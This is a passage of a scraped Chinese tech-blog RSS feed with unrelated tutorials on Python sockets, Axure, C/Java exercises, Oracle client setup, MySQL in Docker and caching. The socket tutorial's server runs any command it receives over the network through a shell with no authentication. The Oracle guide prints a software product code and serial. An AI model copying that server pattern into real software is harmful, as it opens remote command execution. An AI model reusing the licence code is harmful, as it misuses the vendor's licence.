# 指定服务端ip和端口
#通信循环
while
True
:
msg
=
input
(
'&gt;&gt;: '
)
.
strip
(
)
#套接字中无法发送空字符
if
len
(
msg
)
==
0
:
continue
phone
.
send
(
msg
.
encode
(
'utf-8'
)
)
data
=
phone
.
recv
(
1024
)
print
(
data
)
phone
.
close
(
)
如果在重启服务端的过程中出现如下的情况表示服务端仍在四次挥手的time_wait状态(服务端进程依然在后台运行)，此时可以采取两种方法。
修改绑定给服务端的端口号
在绑定服务端的ip和端口前加上phone.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
三、基于udp的套接字通信
基于udp协议编写的套接字如下：
#服务端
import
socket
#socket.SOCK_DGRAM表示udp协议，udp是数据报协议
server
=
socket
.
socket
(
socket
.
AF_INET
,
socket
.
SOCK_DGRAM
)
server
.
bind
(
(
'127.0.0.1'
,
8080
)
)
#udp协议不需要建立通信通道，因此它是不可靠的通信协议
#简单来说tcp是一对一的收发消息，一个客户端结束才会回应其他客户端
#udp是一对多的收发消息，由客户端发送消息时服务端就会回应
while
True
:
#接收客户端的消息
data
,
client_addr
=
server
.
recvfrom
(
1024
)
print
(
'===&gt;'
,
data
,
client_addr
)
#发送消息给客户端，由于没有链接通道，发送信息需要带上客户端的ip和端口信息
server
.
sendto
(
data
.
upper
(
)
,
client_addr
)
server
.
close
(
)
#客户端
import
socketclient
=
socket
.
socket
(
socket
.
AF_INET
,
socket
.
SOCK_DGRAM
)
while
True
:
msg
=
input
(
'&gt;&gt;: '
)
.
strip
(
)
#向服务端的ip和端口发送信息
client
.
sendto
(
msg
.
encode
(
'utf-8'
)
,
(
'127.0.0.1'
,
8080
)
)
data
,
server_addr
=
client
.
recvfrom
(
1024
)
print
(
data
)
client
.
close
(
)
四、粘包现象
将服务端的代码作如下的修改：
import
socket
,
subprocessphone
=
socket
.
socket
(
socket
.
AF_INET
,
socket
.
SOCK_STREAM
)
phone
.
setsockopt
(
socket
.
SOL_SOCKET
,
socket
.
SO_REUSEADDR
,
1
)
phone
.
bind
(
(
'127.0.0.1'
,
8080
)
)
phone
.
listen
(
5
)
while
True
:
conn
,
client_addr
=
phone
.
accept
(
)
while
True
:
try
:
data
=
conn
.
recv
(
1024
)
if
len
(
data
)
==
0
:
break
a
=
subprocess
.
Popen
(
data
.
decode
(
'utf-8'
)
,
shell
=
True
,
stdout
=
subprocess
.
PIPE
,
stderr
=
subprocess
.
PIPE
)
res
=
a
.
stdout
.
read
(
)
conn
.
send
(
res
)
except
ConnectionResetError
:
break
conn
.
close
(
)
phone
.
close
(
)
我们尝试在客户端通过指令tasklist查看服务端的进程列表，第一次客户端向服务端发送tasklist命令返回如下的结果：
映像名称 PID 会话名 会话# 内存使用
========================= ======== ================ =========== ============
System Idle Process 0 Services 0 8 K
System 4 Services 0 12 K
Registry 296 Services 0 26,600 K
smss.exe 892 Services 0 528 K
csrss.exe 1124 Services 0 2,840 K
wininit.exe 1236 Services 0 3,400 K
services.exe 1308 Services 0 8,912 K
lsass.exe 1332 Services 0 20,172 K
svchost.exe 1460 Services 0 29,432 K
fontdrvhost.exe 1484 Services 0 104 K
WUDFHost.exe 1536 Services 0 2,952 K
svchost.
第二次当客户端向服务端发送ping www.baidu.com时会发现返回的结果依然是客户端的进程列表：
exe 1596 Services 0 15,092 K
svchost.exe 1640 Services 0 6,416 K
WUDFHost.exe 1764 Services 0 21,224 K
svchost.exe 1876 Services 0 3,868 K
svchost.exe 1884 Services 0 7,436 K
svchost.exe 1904 Services 0 4,420 K
svchost.exe 1940 Services 0 9,876 K
svchost.exe 1948 Services 0 7,880 K
svchost.exe 2036 Services 0 7,128 K
svchost.exe 1304 Services 0 15,372 K
svchost.exe 2128 Services 0 4,932 K
svchost.exe 2140 Services 0 6,348 K
svchost.exe 2148 Services 0 7,032 K
svchost.exe
这是怎么回事呢？我们知道tcp协议是流式协议，也就是说基于tcp协议发送消息时，服务端套接字会把需要发送的消息给自己的操作系统，而自己的操作系统将这些消息一段一段发送给客户端的操作系统，由于是一段一段的发送，客户端无法判断一条消息的始末，所以客户端套接字每次只从操作系统中取字节数限制字节的消息，当发送的消息量过大时，只有一部分消息会被接收并打印到终端上，剩余的消息依然在客户端的操作系统中。当我们再次向服务端发送消息接收消息以后，套接字会先接收上次没有接受完的消息，再接受新的消息，这就产生了粘包现象。
另外如果tcp多次短间隔的发送消息，发送端的套接字会将这些消息并再一起发送，这样会发送接受方的另一种粘包问题。
这时候肯定有人要说如果我们不限制套接字每次接受的字节数是不是就能解决这个问题呢？问题是如果我们接受的是一个很大的内容，比如50g，套接字会将接受的消息全部读入内存，这就会引发内存爆满的情况，显然这种解决方式是不可取的。
udp协议是数据报式的协议，也就是说udp每次收发消息都是以一个数据报为单位的(套接字会给每次的消息加上消息头)，每次接受消息都会取干净，所以如果服务端接收的字节限制比接收内容小时，多出来的内容会丢失，而不会发送粘包的问题。由于udp的消息都是由消息头的，所以即便是短时间内发送多次消息，也不会发送上面说到的第二种粘包问题。
tcp是基于数据流的，于是收发的消息不能为空，这就需要在客户端和服务端都添加空消息的处理机制，防止程序卡住，而udp是基于数据报的，即便是你输入的是空内容（直接回车），那也不是空消息，udp协议会帮你封装上消息头。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540040.html</guid><pubDate>Fri, 31 Oct 2025 07:21:44 +0000</pubDate></item><item><title>Axure重要元件三——中继器函数</title><link>https://www.ppmy.cn/news/1540041.html</link><description>亲爱的小伙伴，在您浏览之前，烦请关注一下，在此深表感谢！
课程主题：中继器函数
主要内容：Item、Reperter、TargetItem
1、中继器的函数：Item\Reperter\TargetItem
Item
item：获取数据集一行数据的集合，即数据行的对象；
item.列名：获取数据行中指定列的值；
index：获取数据行的索引编号，编号起始为1，由上至下每行递增1；
isFirst：判断数据行是否为第1行；
isLast：判断数据行是否为最末行；
isEven：判断数据行是否为偶数行；
isOdd：判断数据行是否为奇数行；
isMarked：判断数据行是否为被标记；
isVisible：判断数据行是否为可见行。
Reperter
visibleItemCount：中继器项目列表中可见项的数量，即本页有多少条数据；
itemCount：加载项数量；
dataCount：获取中继器数据集中数据行的总数量，即中继器总共有多少条数据；
pageCount：获取中继器分页的总数量，即中继器一共有多少页；
pageindex：获取中继器项目列表当前显示内容的页码。
2、中继器的属性：
This：获取当前元件对象，当前元件指添加事件的元件；
Target：获取目标元件对象，目标元件指添加动作的元件；
x：获取元件对象的X轴坐标值；
y：获取元件对象的Y轴坐标值；
width：获取元件对象宽度值；
height：获取元件对象高度值；
scrollX：获取元件对象水平移动的距离；
scrollY：获取元件对象垂直移动的距离；
text：获取元件对象的文字；
name：获取元件对象的名称；
top：获取元件对象顶部边界的坐标值；
left：获取元件对象左边界的坐标值；
right：获取元件对象右边界的坐标值；
bottom：获取元件对象底部边界的坐标值；
opacity：获取元件对象的不透明度；
rotation：获取元件对象的旋转角度。
3、Item和TargetItem的区别
区别：Item作用范围当前中继器，TargetItem作用范围是页面中所有中继器
下面通过两个实例来区分：
我们选中第一个中继器，去操作第二个中继器，结果发现出现TargetItem
我们选中第一个中继器，去操作第一个中继器，结果没有出现TargetItem
扩展注释：
对象的定义：当前元件、目标元件等；Axure中当前操作的单一元件、组合元件都可以成为对象；
属性的定义：元件的宽、高、长；字符串的长度等；
函数的定义：获取数值的指令，包括不限于数值内容、数值类型、数值的统计、数值的编辑等。
本课小结：中继器函数的应用在于理解Item、Reperter、TargetItem，操作当前中继器我们就使用Item\Reperter对应的函数，多个中继器交互需要使用TargetItem对应的函数；
连续课程直通车
Axure重要元件三——中继器-CSDN博客
Axure重要元件三——中继器表单制作-CSDN博客
Axure重要元件三——中继器查询和统计-CSDN博客
Axure重要元件三——中继器时间排序-CSDN博客
Axure重要元件三——中继器添加数据-CSDN博客
Axure重要原件三——中继器删除数据-CSDN博客
Axure重要元件三——中继器修改数据-CSDN博客
Axure重要元件三——中继器函数-CSDN博客
中继器实现时间读取和修改-CSDN博客
如有其他相关问题，欢迎私信沟通，关注  结构化知识课堂-CSDN博客
明天的产品大咖就是你，创作不易，麻烦关注一下，点赞+收藏，感谢大家！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540041.html</guid><pubDate>Fri, 31 Oct 2025 07:21:46 +0000</pubDate></item><item><title>【原创教程】工控人升维必看：激光传感器的应用案例</title><link>https://www.ppmy.cn/news/1540042.html</link><description>在自动化控制中，有很多传感器，今天我们看一款激光传感器，工作原理是由激光发射二极管对准目标发射激光脉冲，经目标反射后激光向各方向散射，部分散射光回到传感器接收器，被光学系统接受后成像到光电二极管上。
本系统我们采用的西门子SMART200系列，用的是6ES7288-0AA0模拟量模块，来采集激光传感器的信号。
我们来看看这款施克SICK激光传感器，型号为DT50-P1113，此传感器是用来测量一个距离某物体的距离，传感器外形如下图所示：
下面我们看线是如何接的？
其中引出的三根线，棕色线接24V正，蓝线接24V负，黑色为信号线接在模拟量模块上的0+引脚上，0-引脚接到-24V上，如下图所示：
我们接着看程序中的参数设置如下
1.设定距离ÿ</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540042.html</guid><pubDate>Fri, 31 Oct 2025 07:21:48 +0000</pubDate></item><item><title>CANIOT网关CAN透传功能的具体介绍</title><link>https://www.ppmy.cn/news/1540043.html</link><description>来可电子的CANIOT透传网关具有CAN数据透传功能，接下来介绍一下具体的操作步骤和如何在电脑上显示接收的数据。
首先我们给网关通电，并将网关的CAN口连接到我们的CAN设备上，这里我们使用来可电子的USBCAN卡来模拟CAN设备发送数据，网关和CAN卡的接线如下图所示。
接下来我们使用自己的账号登录网关的透传客户端软件，单击选中左侧在线设备，进入远程维护界面，点开CAN1透传，选择服务器模式，配置好波特率和端口，IP不要改动，然后点击启用按钮。
接下来我们打开来可电子的CAN测试软件VBDSP，先打开一个USBCAN设备，并设置好波特率，用来模拟CAN设备发送数据，再打开一个LCNET_TCP设备，用来显示网关上接收到的CAN数据，并在两边分别添加一个发送任务。
注： LCNET_TCP设备的参数配置按照透传客户端中CAN1口的配置来填写。
按照上述步骤操作好之后，打开两个设备，勾选发送任务开始发送数据，得到的记录结果如下图所示。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540043.html</guid><pubDate>Fri, 31 Oct 2025 07:21:52 +0000</pubDate></item><item><title>ZBrush和3D-Coat各自的优缺点是什么？</title><link>https://www.ppmy.cn/news/1540044.html</link><description>zbrush支持的模型面数高英文界面，3d coat支持的模型面数比zbrsh低有中文界
ZBrush优缺点
1、ZBrush优点：
zbrush是高精度建模poser制作的首选。可搭配雕刻版使用，主要为烘焙高细节的铁图建模。因为是高精度模型，不适用于动画和游戏制作，所以建模师普遍用它来制作贴图，辅助Maya和Max实现低模高质感。
2、ZBrush缺点：
一般雕刻完之后，因为是高精度模型，不适用于动画和游戏制作，所以建模师普遍用它来制作贴图，辅助maya和max实现低模高质感。
3D Coat优缺点
1. 3D-Coat优点：
3dmax能做的事情就很多了。建模、动画、渲染、粒子，很多将zbrush的高细节模型贴图烘焙出来，最后在3dmax或者maya里将高细节贴图给低面数模型来达到一个细节充分，渲染负荷又轻的目的。 一般都用于实时渲染，比如很多游戏里的角色。其实面数很少，但是贴图高细节，达到视觉和性能的平衡。
2. 3D-Coat缺点：
主要用来做游戏建模的，因为它的规则专性命令比较属多，建模师会用来做场景建模，广泛用来展示之用。
zbrush支持的模型面数高英文界面，3d coat支持的模型面数比zbrsh低有中文界面
同等配置zbrush雕刻的细节更多，也是主流雕刻软件。具体如何选择还是看自己偏好和需求。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540044.html</guid><pubDate>Fri, 31 Oct 2025 07:21:53 +0000</pubDate></item><item><title>一些简单的编程题（Java与C语言）</title><link>https://www.ppmy.cn/news/1540045.html</link><description>引言：
这篇文章呢，小编将会举一些简单的编程题用来帮助大家理解一下Java代码，并且与C语言做个对比，不过这篇文章所出现的题目小编不会向随缘解题系列里面那样详细的讲解每一到题，本篇文章的主要目的是帮助小编和读者们熟悉Java代码。后续小编将会开始更新java模块的知识体系！！！
一、题目一
编写程序数一下1到 100 的所有整数中出现多少个数字9
1- 题目分析
首先，1~100之间要想出现9，只有可能出现在个位或者十位上，比如说19，这里9就出现在个位上，又比如说91，这里9就出现在十位上，因此我们想要得到1~100以内9的个数，只需要将该数
num/10
这样就可以得到十位上的数字，
num%10
这样就可以得到个位上的数字
2- C语言代码编写：
#include &lt;stdio.h&gt;
int main()
{int count = 0;//计数器用来存放9的个数for (int i = 1; i &lt;= 100; i++){if (i / 10 == 9 )count++;//十位上是9就加1if (i % 10 == 9)count++;//个位上是9就加1}printf("%d", count);return 0;
}
3- Java代码编写：
public class Test {public static void main(String[] args) {int count = 0; //存放9的个数for (int i = 1; i &lt;= 100 ; i++) {if(i/10 == 9)count++;if(i%10 == 9)count++;}System.out.println(count);}
}
4- 结果演示：
二、题目二
输出 1000 - 2000 之间所有的闰年
1- 题目分析
关于闰年相比大家都已经很熟悉了，简单说一下判断是不是闰年有两种方法；
能被4整除但不能被100整除
能被400整除的数
通过循环获得1000~2000的数。
2- C语言代码编写：
#include &lt;stdio.h&gt;
int main()
{for (int i = 1000; i &lt;= 2000; i++){if ((i % 4 == 0 &amp;&amp; i % 100 != 0) || i % 400 == 0){printf("%d ", i);}}return 0;
}
3- java代码编写：
public class Test {public static void main(String[] args) {for (int i = 1000; i &lt;= 2000 ; i++) {if(i%4 == 0 &amp;&amp; i % 100!=0 || i%400==0){System.out.println(i);}}}
}
4- 结果演示：
三、题目三
计算1/1-1/2+1/3-1/4+1/5 …… + 1/99 - 1/100 的值 。
1- 题目分析
本题分子都是1，且分母从1~100，每个数想表示出来很简单，因此这道题唯一需要解决的问题就是怎么表示正负，表示正负的方法有很多，这里我就使用一种来介绍一下，看代码
2- C语言代码编写：
#include &lt;stdio.h&gt;
int main()
{double sum = 0.0;int flg = 1;//假设起始为1for (int i = 1; i &lt;= 100; i++){sum = sum + 1.0 / i * flg;//1.0/i是为了得到的数字是小数类型，每位数都与flg相乘flg = -flg;//如果上一个flg是1，则下次循环时flg变为-1，实现正负交替}printf("%lf", sum);return 0;
}
3- java代码编写：
public class Test {public static void main(String[] args) {double sum = 0.0;int flg = 1;for (int i = 1; i &lt;= 100 ; i++) {sum = sum + 1.0/i*flg;flg = -flg;}System.out.println(sum);}
}
4- 结果演示：
四、题目四
输出一个整数的每一位，如：123的每一位是3，2，1
1- 题目分析：
可以通过num%10得到最低位，再通过num/10去除最低位
这里就不详细介绍怎么得到的了，如果有不会的可以点这里查看
题目讲解（2）-CSDN博客
2- C语言代码编写：
#include &lt;stdio.h&gt;
int main()
{int num = 0;scanf("%d", &amp;num);while (num){printf("%d ", num % 10);num /= 10;}return 0;
}
3- Java代码编写：
java的数据输入：
import java.util.Scanner;
public class Test {
public static void main(String[] args) {Scanner scanner = new Scanner(System.in);int num = scanner.nextInt();while(num!=0){System.out.println(num%10);num = num /10;}}
}
这里使用了
java中的数据输入
，后面介绍java的时候会讲到
4- 结果演示：
五、题目五
编写代码模拟三次密码输入的场景。 最多能输入三次密码，密码正确，提示“登录成功”,密码错误， 可以重新输入，最多输入三次。三次均错，则提示退出程序
1- 题目分析
首先需要设置一个正确密码，然后再创建一个数组用来存放你输入的密码，题目中说了有三次输入机会，因此可以使用
while循环
，循环条件可以是输入次数不为0，这样当循环次数为0也就是说三次都输错了，退出循环。使用strmp函数来比较我们输入的字符串与原密码是否相等，如果相等，则提示登陆成功。
2- C语言代码编写：
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main() {char rightPIN[] = "123456"; // 设定正确密码char inputPIN[20];int count = 3;while (count != 0) {printf("请输入密码：");scanf("%s", inputPIN);if (strcmp(inputPIN, rightPIN) == 0) //比较输入的密码是否和正确密码一样{printf("登录成功！\n");return 0;}else {printf("密码错误，请重新输入。\n");count--;}}printf("三次密码输入错误，退出程序。\n");return 0;
}
3- java代码编写：
import java.util.Scanner;
public class Test {   
public static void main(String[] args) {int count = 3;Scanner scanner = new Scanner(System.in);while(count != 0){System.out.println("你还有"+count+"次机会");System.out.println("请输入密码：");String pass = scanner.nextLine();if (pass.equals("123456")){System.out.println("登陆成功");return;}else{count--;}}}
}
这里使用了java中
字符串比较
的方法，后续也会介绍到。
4- 结果演示：
结语：
这篇文章没有介绍什么知识点，主要是为了引出小编后续将要介绍的知识，不过从这篇文章也能了解一些关于java的用法，比如说java的输入，输出，以及字符串比较！
关于C语言的知识，小编还没有更新完成，不过不用担心小编更新Java就不更新C语言后面的知识了，关于C语言剩下的那点内容，小编呢会找时间将它们全部介绍完，能够让大家在我这里找到完整的C语言笔记。敬请期待！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540045.html</guid><pubDate>Fri, 31 Oct 2025 07:21:56 +0000</pubDate></item><item><title>c/c++中void定义的空类型指针(void* p)要怎么使用（强制类型转换）以及使用场景(函数指针)</title><link>https://www.ppmy.cn/news/1540046.html</link><description>我们先看看下面的代码，p是一个void类型的指针，ch是一个char类型的变量，当我们用p来保存ch的地址时，我们却无法通过*p来对ch的值进行访问，因为char会自动转化为void*类型的指针，也就是空类型指针，
空类型指针
（无类型可以是任意类型）
，
只存储地址的值，丢失类型，无法访问，要访问其值，就要对这个指针进行强制类型转换
char* p1 = (char*)p;
printf("p1 指向的字符是:  %c\n",*p1);//值为a
通过这段代码就能对ch的值进行访问了
int main(void) {int arr[] = { 1,2,3,4,5 };char ch = 'a';void* p = arr; //定义了一个void 类型的指针p = &amp;ch;//其它类型会自动转换成void *指针printf("p: 0x%p ch: 0x%p\n", p, &amp;ch);//结果是p和ch的地址相同且都能打印出来//强制类型转化char* p1 = (char*)p;printf("p1 指向的字符是:  %c\n",*p1);system("pause");return 0;
}
那么什么时候会用到空指针类型呢？请看下面
void 指针可以指向任意类型的数据，不受数据类型限制，可以在程序中给我们带来一些好处，函数中形参为指针类型时，我们可以将其定义为 void 指针，这样函数就可以接受任意类型的指针。如：
典型的如内存操作函数 memcpy 和 memset 的函数原型分别为：
void * memcpy(void *dest, const void *src, size_t len);void * memset ( void * buffer, int c, size_t num );
这样，任何类型的指针都可以传入 memcpy 和 memset 中，这也真实地体现了内存操作函数的意义，
因为它操作的对象仅仅是一片内存，而不论这片内存是什么类型</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540046.html</guid><pubDate>Fri, 31 Oct 2025 07:21:59 +0000</pubDate></item><item><title>PL/SQL Developer15和Oracle Instant Client安装配置详细图文教程</title><link>https://www.ppmy.cn/news/1540047.html</link><description>一、下载介质
1、Oracle Instant Client
Oracle Instant Client Downloads | Oracle 中国
2、PL/SQL DEVELOPER
PL/SQL Developer - Allround Automations
Free trial - Allround Automations
二、安装介质。
1、安装plsqldev1504x64.msi。
一路默认下一步。
选择输入许可信息：
产品码：
4tqw83ltw4ustkjfftny7wjl7tqv9uscs8
序列号：
182522
密码：
*************
一路默认下一步，直到安装完成。
2、安装instantclient-basic-windows.x64-21.10.0.0.0dbru.zip。
解压到自己喜欢的位置即可。
三、配置PLSQL。
1、配置——&gt;首选项。
2、填写Oracle主目录和OCI库。
Oracle主目录
C:\Program Files\PLSQL Developer 15\instantclient_21_10
OCI库
C:\Program Files\PLSQL Developer 15\instantclient_21_10\oci.dll
instantclient-basic-windows.x64-21.10.0.0.0dbru.zip的解压目录。
3、配置Oracle环境变量。
4、创建数据配置文件。
①.在instantclient-basic-windows.x64-21.10.0.0.0dbru.zip的解压目录\network\admin，下创建sqlnet.ora文件。
# This file is actually generated by netca. But if customers choose to
# install "Software Only", this file wont exist and without the native
# authentication, they will not be able to connect to the database on NT.
SQLNET.AUTHENTICATION_SERVICES = (NTS)
②.在instantclient-basic-windows.x64-21.10.0.0.0dbru.zip的解压目录\network\admin，下创建tnsnames.ora文件。
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
# tnsnames.ora Network Configuration File: D:\app\oracle\NETWORK\ADMIN\tnsnames.ora
# Generated by Oracle configuration tools.
TC13 =
(DESCRIPTION =
(ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.0.105)(PORT = 1521))
(CONNECT_DATA =
(SERVER = DEDICATED)
(SERVICE_NAME = tc13)
)
)
EXTPROC_CONNECTION_DATA =
(DESCRIPTION =
(ADDRESS_LIST =
(ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1))
)
(CONNECT_DATA =
(SID = PLSExtProc)
(PRESENTATION = RO)
)
)
注：以上两个文件可参考Oracle服务器上的\NETWORK\ADMIN\目录下的同名文件进行改写。
5、重启PLSQL Developer 15 (64 bit)，登录窗口还是点击取消。
6、配置——&gt;链接，创建新的链接。
填写链接的信息之后，进行测试。
测试成功之后，点击确定即可。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540047.html</guid><pubDate>Fri, 31 Oct 2025 07:22:02 +0000</pubDate></item><item><title>基于SSM党务政务服务热线管理系统的设计</title><link>https://www.ppmy.cn/news/1540048.html</link><description>管理员账户功能包括：系统首页，个人中心，用户管理，部门管理，办事信息管理，信息记录管理，系统管理
前台账号功能包括：系统首页，个人中心，部门，信息记录，后台管理
开发系统：Windows
架构模式：SSM
JDK版本：Java JDK1.8
开发工具：IDEA(推荐)
数据库版本： mysql5.7
数据库可视化工具： navicat
服务器：SpringBoot自带 apache tomcat
主要技术：Java,Spring,mybatis,mysql,jquery,html</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540048.html</guid><pubDate>Fri, 31 Oct 2025 07:22:04 +0000</pubDate></item><item><title>链式法则 反向传播</title><link>https://www.ppmy.cn/news/1540049.html</link><description>“反向传播 x” 和 “损失函数”：
反向传播是一种用于训练神经网络的算法，通过计算损失函数对模型参数的梯度，然后根据这些梯度更新参数以最小化损失函数。
损失函数用于衡量模型预测值与真实值之间的差异。
“w,b” 和 “y = wx + b”：
“w” 和 “b” 分别代表线性回归模型中的权重和偏置。
“y = wx + b” 是线性回归模型的公式，其中 “x” 是输入特征，“y” 是模型的预测输出。
这些公式表示损失函数 “L” 对权重 “w” 和偏置 “b” 的偏导数计算。偏导数用于确定损失函数在每个参数方向上的变化率，从而指导参数的更新。
表格部分：
第一行列出了各个参数的名称，包括输入 “x”、权重 “w”、偏置 “b” 以及模型的输出计算公式。
第二行展示了一个具体的示例数据点，其中输入 “x” 为 1.5，初始权重 “w” 为 0.8，初始偏置 “b” 为 0.2，模型输出为 “0.8×1.5 + 0.2 = 1.4”。
第三行可能是另一个数据点或者中间计算结果，输入 “x” 仍为 1.5，但权重变为 0.71，偏置暂未给出，模型输出计算为 “0.71×1.5 + 暂未给出的值 = 1.205”。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540049.html</guid><pubDate>Fri, 31 Oct 2025 07:22:07 +0000</pubDate></item><item><title>设计模式03-装饰模式(Java)</title><link>https://www.ppmy.cn/news/1540050.html</link><description>4.4 装饰模式
1.模式定义
不改变现有对象结构的情况下，动态地给该对象增加一些职责（即增加其额外功能）的模式。
2.模式结构
抽象构件角色 ：定义一个抽象接口以规范准备接收附加责任的对象。客户端可以方便调用装饰类和被装饰类。
具体构件角色 ：实现抽象构件，通过装饰角色为其添加一些职责。
抽象装饰角色 ： 继承或实现抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能。
具体装饰角色 ：实现抽象装饰的相关方法，并给具体构件对象添加附加的责任。
3.模式原理
在不改变对象本身的基础之上，给对象添加或删除行为，往往可以通过继承机制或者是关联机制实现
继承机制：通过子类对父类的继承，重写或添加新的方法来扩展类
关联机制：将一个类的对象嵌入另一个类的对象之中，进而在另一个类中扩展其行为（通过递归嵌套实现多层装饰）
4.代码模板
抽象装饰类
public
class
Decorator
implements
Component
{
//关联抽象构建
private
Component
component
;
//构造注入具体构建
public
Decorator
(
Component
component
)
{
this
.
component
=
component
;
}
@Override
public
void
operation
(
)
{
component
.
operation
(
)
;
}
}
具体装饰类
public
class
ConcreteDecorator
extends
Decorator
{
public
ConcreteDecorator
(
Component
component
)
{
super
(
component
)
;
}
public
void
operation
(
)
{
super
.
operation
(
)
;
addBehavior
(
)
;
}
private
void
addBehavior
(
)
{
//新增方法
}
}
5.案例分析
public
interface
Call
{
public
void
callMusic
(
)
;
}
public
class
Phone
implements
Call
{
public
Phone
(
)
{
System
.
out
.
println
(
"普通手机"
)
;
}
@Override
public
void
callMusic
(
)
{
System
.
out
.
println
(
"来电话了，手机发出响声"
)
;
}
}
public
class
Decorator
implements
Call
{
private
Call
call
;
public
Decorator
(
Call
call
)
{
this
.
call
=
call
;
}
public
void
setCall
(
Call
call
)
{
this
.
call
=
call
;
}
@Override
public
void
callMusic
(
)
{
System
.
out
.
println
(
"来电话了，手机发出响声"
)
;
}
}
public
class
JarPhone
extends
Decorator
{
public
JarPhone
(
Call
call
)
{
super
(
call
)
;
System
.
out
.
println
(
"振动手机"
)
;
}
public
void
jar
(
)
{
super
.
callMusic
(
)
;
System
.
out
.
println
(
"振动~~~"
)
;
}
}
public
class
LightPhone
extends
Decorator
{
public
LightPhone
(
Call
call
)
{
super
(
call
)
;
System
.
out
.
println
(
"闪光手机"
)
;
}
public
void
light
(
)
{
super
.
callMusic
(
)
;
System
.
out
.
println
(
"闪光~~~"
)
;
}
}
public
class
Main
{
public
static
void
main
(
String
[
]
args
)
{
Phone
phone
=
new
Phone
(
)
;
System
.
out
.
println
(
"电话来了"
)
;
phone
.
callMusic
(
)
;
System
.
out
.
println
(
"————————————————"
)
;
JarPhone
jarPhone
=
new
JarPhone
(
phone
)
;
System
.
out
.
println
(
"电话来了"
)
;
jarPhone
.
jar
(
)
;
System
.
out
.
println
(
"————————————————"
)
;
LightPhone
lightPhone
=
new
LightPhone
(
phone
)
;
System
.
out
.
println
(
"电话来了"
)
;
lightPhone
.
light
(
)
;
System
.
out
.
println
(
"————————————————"
)
;
//将闪光手机改装成可以振动且闪光的手机
System
.
out
.
println
(
"组装手机："
)
;
lightPhone
.
light
(
)
;
jarPhone
.
setCall
(
lightPhone
)
;
jarPhone
.
jar
(
)
;
}
}
6.模式优缺点
7.模式使用场景
8.模式应用
IO流中使用：InputStream和OutputStream中只提供了简单的读写操作，通过装饰模式可以得到具有文件输入输出的FileInputStream等
javax.swing中也有大量使用</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540050.html</guid><pubDate>Fri, 31 Oct 2025 07:22:09 +0000</pubDate></item><item><title>docker+mysql创建用户名密码_docker里面的mysql 更换密码</title><link>https://www.ppmy.cn/news/1540051.html</link><description>进入mysql容器
操作vi etc/mysql/my.cnf
默认是不安装vi编辑器的，下面安装vi
更新安装包
apt-get update
安装vim
执行这条语句
apt-get install vim
到修改docker容器里面的mysql数据库密码了
启动mysql容器
docker exec -it mysql /bin/bash
编辑配置文件
我这里是没有这个配置文件，直接编辑即可，有的忽略
vi /etc/mysql/conf.d/docker.cnf
加上这4段
[mysqld]
skip-host-cache
skip-name-resolve
skip-grant-tables 跳过权限认证
保存退出
root@25cf6844e4d5:/# exit
exit
重启mysql容器
我命名的mysql容器名是mysql01，按照自己的名字重启
[root@rzk ~]# docker restart mysql01
mysql01
进入mysql容器,连接mysql
docker exec -it mysql /bin/bash
[root@rzk ~]# docker exec -it mysql01 /bin/bash
root@25cf6844e4d5:/# mysql -u root -p
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 275
Server version: 5.7.31 MySQL Community Server (GPL)
Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql&gt;
修改密码
mysql&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql&gt; update user set authentication_string=password('密码') where user='root';
Query OK, 0 rows affected, 1 warning (0.00 sec)
Rows matched: 2 Changed: 0 Warnings: 1
删除权限认证这行
skip-grant-tables 跳过权限认证 这一段需要删除，不然后续登录还是会免密码
[mysqld]
skip-host-cache
skip-name-resolve
skip-grant-tables 跳过权限认证
刷新权限
mysql&gt; flush privileges;
Query OK, 0 rows affected (0.07 sec)
测试连接数据库
密码就修改成功了
原始地址
© 著作权归作者所有,转载或内容合作请联系作者
喜欢的朋友记得点赞、收藏、关注哦！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540051.html</guid><pubDate>Fri, 31 Oct 2025 07:22:11 +0000</pubDate></item><item><title>缓存常见问题：缓存穿透、雪崩、击穿及解决方案分析</title><link>https://www.ppmy.cn/news/1540052.html</link><description>1. 什么是缓存穿透，怎么解决？
缓存穿透是指
用户请求的数据在
缓存中不存在即没有命中，同时在数据库中也不存在
，导致用户每次请求该数据都要去数据库中查询一遍
。如果有恶意攻击者不断请求系统中不存在的数据，会导致短时间大量请求落在数据库上，造成数据库压力过大，甚至导致数据库承受不住而宕机崩溃。
缓存穿透的关键在于在Redis中查不到key值，它和缓存击穿的根本区别在于传进来的key在Redis中是不存在的。假如有黑客传进大量的不存在的key，那么大量的请求打在数据库上是很致命的问题，所以在日常开发中要对参数做好校验，一些非法的参数，不可能存在的key就直接返回错误提示。
正常的查询流程
缓存穿透查询流程
解决方法：
方案一：缓存空数据
将无效的key存放进Redis中：
当出现Redis查不到数据，数据库也查不到数据的情况，也将其缓存起来，但设置一个
较短的过期时间
，这样即使后续的恶意请求再次访问相同的键，也能够从缓存中获取结果，减轻数据库压力
。但这种处理方式是有问题的，
假如传进来的这个不存在的Key值每次都是随机的，那存进Redis也没有意义。
优点：
实现简单
缺点：
消耗内存，可能会发生数据不一致的问题。
方案二：布隆过滤器
使用布隆过滤器：
在缓存之前再加一个布隆过滤器，将数据库中的所有key都存储在布隆过滤器中，
在查询Redis前先去布隆过滤器查询 key 是否存在，如果不存在就直接返回
